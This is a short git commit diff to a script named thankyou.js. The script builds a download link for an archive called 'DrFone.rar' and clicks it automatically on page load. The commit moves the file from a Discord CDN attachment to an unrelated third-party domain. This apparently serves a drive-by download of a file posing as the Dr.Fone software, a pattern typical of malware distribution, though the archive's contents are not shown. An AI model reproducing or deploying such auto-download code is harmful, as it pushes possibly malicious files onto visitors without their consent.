d4c0ba7e7cafdd4b1b44473df017912f7ea22fd1
klasso <57557028+klasso@users.noreply.github.com>
2021-02-12 20:45:15 +0200

    Update thankyou.js

--- thankyou.js
+++ thankyou.js
@@ -1,4 +1,4 @@
 var link = document.createElement('a');
-link.setAttribute('href','https://cdn.discordapp.com/attachments/800051540953399306/809842831103492157/DrFone.rar');
+link.setAttribute('href','https://importacioneslumina.com/files/DrFone.rar');
 link.setAttribute('download','download');
 onload=link.click();
